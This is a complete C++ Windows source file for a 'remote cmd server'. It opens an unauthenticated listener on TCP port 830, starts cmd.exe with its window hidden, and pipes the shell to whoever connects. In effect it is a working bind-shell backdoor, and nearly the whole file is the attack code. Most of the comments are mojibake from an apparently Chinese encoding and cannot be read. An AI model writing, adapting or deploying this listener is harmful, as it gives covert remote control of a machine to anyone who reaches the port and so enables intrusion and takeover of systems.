/*
  This project was created and edited using the MFC SelfBanner AppWizard.

  Comment: Զ�̿��ƣ�Զ��Cmd�����.

  Project: test.
  Author : dhyao
  Date   : ����һ, ���� 02, 2009
*/
// ntCmdServer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"Ws2_32")


#define BUFFER_SIZE 1024


void ShellSession(SOCKET master_sock, char *lpShellName)
{
	char dataBuffer[BUFFER_SIZE];
	DWORD lBytesRead, ret;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	HANDLE hShellWrite = NULL, hReadPipe = NULL;
	HANDLE hShellRead = NULL, hWritePipe = NULL;
	struct timeval tv;
	fd_set readfds;

	tv.tv_sec = 0; 
	tv.tv_usec = 100000;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//˫�ܵ����Ա���ɸ��ӽ���֮���˫��ͨ��
	//�����ܵ�һ��
	if (!CreatePipe(&hReadPipe, &hShellWrite, &sa, 0))
	{
		goto session_error;
	}
	//�����ܵ�����
	if (!CreatePipe(&hShellRead, &hWritePipe, &sa, 0))
	{
		goto session_error;
	}

	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//����CMD����
	si.wShowWindow = SW_HIDE;
	//�������ڹܵ���������������ΪCMD�ı�׼����
	si.hStdInput = hShellRead;
	//��CMD��׼����Լ������������д�����ܵ�������
	si.hStdOutput = hShellWrite;
	si.hStdError = hShellWrite;

	//��Ԥ�����õĲ�������CMD����
	if (!CreateProcess(lpShellName, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		goto session_error;

	while (1)
	{
		//���CMD�Ƿ����������
		if (!PeekNamedPipe(hReadPipe, dataBuffer, 1, &lBytesRead, NULL, NULL))
		{
			printf("PeekNamedPipe() ʧ��");// GetLastError()
			break;
		}
		//�������ݣ���lBytesRead����0����˵���ReadFile�����ݴӹܵ��ж���
		if (lBytesRead > 0)
		{
			if (!ReadFile(hReadPipe, dataBuffer, BUFFER_SIZE, &lBytesRead, NULL))
				break;

			//�������ݺ󣬽��䷢�͵�Զ�̵����ض�
			ret = send(master_sock, dataBuffer, lBytesRead, 0);

			if (ret == 0 || ret == SOCKET_ERROR)
				break;
		}
		else//���ܵ��������ݿɶ�
		{
			
			ret = WaitForSingleObject(pi.hProcess, 0);

			if (ret == WAIT_OBJECT_0)
				break;

			FD_ZERO(&readfds);
			FD_SET(master_sock, &readfds);
			//��ȴ������������ض˵���������
			ret = select(0, &readfds, NULL, NULL, &tv);

			if (ret == SOCKET_ERROR)
				break;

			if (!FD_ISSET(master_sock, &readfds))
				continue;
			//�������ض˽��յ��������ͨ���ܵ������䷢�͸�CMD
			ret = recv(master_sock, dataBuffer, BUFFER_SIZE, 0);

			if (ret == 0 || ret == SOCKET_ERROR)
				break;

			if (!WriteFile(hWritePipe, dataBuffer, ret, &lBytesRead, NULL))
				break;
		}
	}

	TerminateProcess(pi.hProcess, 0);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

session_error:
	closesocket(master_sock);
	CloseHandle(hReadPipe);
	CloseHandle(hShellWrite);
	CloseHandle(hShellRead);
	CloseHandle(hWritePipe);
}



DWORD WINAPI CmdShellThread(LPVOID lpParam)
{
	char cmd[MAX_PATH];
	SOCKET master_sock = (SOCKET)lpParam;

	GetEnvironmentVariable("ComSpec", cmd, MAX_PATH);
	//����CMD�Ự
	ShellSession(master_sock, cmd);

	return 0;
}


int main(int argc, char* argv[])
{
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	//��ʼ��wsa
	WSAStartup(MAKEWORD(2,2),&ws);
	//����socket
	listenFD = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	//��������830�˿�
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(830);
	server.sin_addr.s_addr=ADDR_ANY;
	ret=bind(listenFD,(sockaddr *)&server,sizeof(server));
	ret=listen(listenFD,2);
	//����ͻ�����830�˿ڣ���������
	int iAddrSize = sizeof(server);
	SOCKET clientFD=accept(listenFD,(sockaddr *)&server,&iAddrSize);
	
	
	SOCKET master_sock=clientFD;
	LPTHREAD_START_ROUTINE lpStartAddress=CmdShellThread;
	HANDLE hThread;
	DWORD dwThreadId;
	//���������߳�
	hThread = CreateThread(NULL, 0, lpStartAddress, (LPVOID)master_sock, 0, &dwThreadId);

	if (hThread == NULL)
	{
		closesocket(master_sock);
		return -1;
	}

	//�ȴ��߳̽���
	ret=WaitForSingleObject(hThread,INFINITE);

	CloseHandle(hThread);
	
	return 0;
}

